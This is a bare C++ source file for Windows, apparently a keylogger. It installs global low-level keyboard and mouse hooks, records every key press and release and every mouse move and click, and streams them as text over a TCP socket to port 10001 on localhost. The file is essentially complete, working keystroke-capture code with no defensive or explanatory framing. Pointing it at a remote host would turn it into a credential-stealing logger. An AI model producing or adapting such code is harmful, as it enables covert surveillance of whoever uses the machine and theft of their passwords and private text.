#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <iostream> 
#include <winsock.h>
#include <sstream>

#define				MOUSE_MOVE					0
#define				MOUSE_LMB_UP				1
#define				MOUSE_LMB_DOWN				2
#define				MOUSE_RMB_UP				3
#define				MOUSE_RMB_DOWN				4

#define _CRT_SECURE_NO_WARNINGS

using namespace std;

int MouseLog (int x, int y, int ev);

SOCKET client;

void derror(char *, int val);

void derror(char *msg, int val)
{
    cout << msg << val;
}

void sendToSocket (const char *msg) {
//	cout << msg << endl;
	send(client, msg, strlen(msg), 0); 
//	cout << "success" << endl;
}

int CreateSocket()
{
	WSADATA wsaData;
	WORD version;
	int error;
	struct hostent *host;
	struct in_addr *ad;
	struct sockaddr_in in;

	version = MAKEWORD( 2, 0 );

	error = WSAStartup( version, &wsaData );

	if ( error != 0 ) {
		derror ("Error at Startup", error);
		return 0;
	}

	if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 ) {
		derror ("Version problem", error);
		return 0;
	}


	client = socket( AF_INET, SOCK_STREAM, 0 );

	host = gethostbyname( "localhost" );

	memset( &in, 0, sizeof in );

	ad = (struct in_addr *)(host->h_addr);

	in.sin_family = AF_INET;
	in.sin_addr.s_addr = ad->s_addr;
	in.sin_port = htons( 10001 );

	error = connect( client, (PSOCKADDR)&in, sizeof in );

	if ( error == SOCKET_ERROR ) {
		derror ("Connect error", error);
		return 0;
	}
	else {
		derror ("Connect Successful", error);
	}

/*	for (int i = 0; i < 1000000; i++) {
		if (rand() % 1000 == 50) {
			Sleep (1000);
			cout << "Sleeping" << endl;
		}
		else if (rand() % 100 == 1) {
			MouseLog(rand() % 1000, rand() % 1000, MOUSE_LMB_DOWN);
		}
		else if (rand() % 100 == 2) {
			MouseLog(rand() % 1000, rand() % 1000, MOUSE_LMB_UP);
		}
		else {
			MouseLog(rand() % 1000, rand() % 1000, MOUSE_MOVE);
		}
	}
*/
	return 1;
}


int KeyLog(char key, int up)
{
	ostringstream str;

	str << "key";

	if (up) {
		str << " up " << key << endl;
	}
	else {
		str << " down " << key << endl;
	}

	str << endl;

//	cout << time (NULL) << str.str();
	sendToSocket (str.str().c_str());

	return 1;
}

int MouseLog (int x, int y, int ev) {
	ostringstream str;

	str << "mouse";

	switch (ev) {
		case MOUSE_MOVE:
			str << " move " << x << "," << y;
		break;
		case MOUSE_LMB_UP:
			str << " lmbup " << x << "," << y;
		break;
		case MOUSE_LMB_DOWN:
			str << " lmbdown " << x << "," << y;
		break;
		case MOUSE_RMB_UP:
			str << " rmbup " << x << "," << y;
		break;
		case MOUSE_RMB_DOWN:
			str << " rmbdown " << x << "," << y;
		break;
		default:
			str << " unknown " << x << "," << y;
		break;
	}

	str << endl;

//	cout << time (NULL) << str.str();
	sendToSocket (str.str().c_str());
	return 1;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
	UINT code;

	code = keyboard->vkCode;
	
	switch(wParam){
		case WM_KEYUP:
			KeyLog ((char)code, 1);			
		break;
		case WM_KEYDOWN:
			KeyLog ((char)code, 0);			
		break;
	}	

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//Mouse hook callback function.
LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam){
	PMSLLHOOKSTRUCT mouse = (PMSLLHOOKSTRUCT) lParam;


//		cout << "nCode is: " << nCode << endl;

	if (nCode < 0) {
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	switch(wParam){
		case WM_LBUTTONUP:
			MouseLog (mouse->pt.x, mouse->pt.y, MOUSE_LMB_UP);
		break;
		case WM_LBUTTONDOWN:
			MouseLog (mouse->pt.x, mouse->pt.y, MOUSE_LMB_DOWN);
		break;
		case WM_RBUTTONUP:
			MouseLog (mouse->pt.x, mouse->pt.y, MOUSE_RMB_UP);
		break;
		case WM_RBUTTONDOWN:
			MouseLog (mouse->pt.x, mouse->pt.y, MOUSE_RMB_DOWN);
		break;
		default: 
			MouseLog (mouse->pt.x, mouse->pt.y, MOUSE_MOVE);
		break;
	}	

	return 0;

//	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
	MSG msg;
	HINSTANCE appInstance = GetModuleHandle(NULL);

	CreateSocket();
	SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0);
    SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, appInstance, 0);

	while(GetMessage(&msg, NULL, 0, 0) > 0){
		if (!CallMsgFilter (&msg, 0)) {
			TranslateMessage(&msg);  
			DispatchMessage(&msg);
		}
	}
	return 0;
}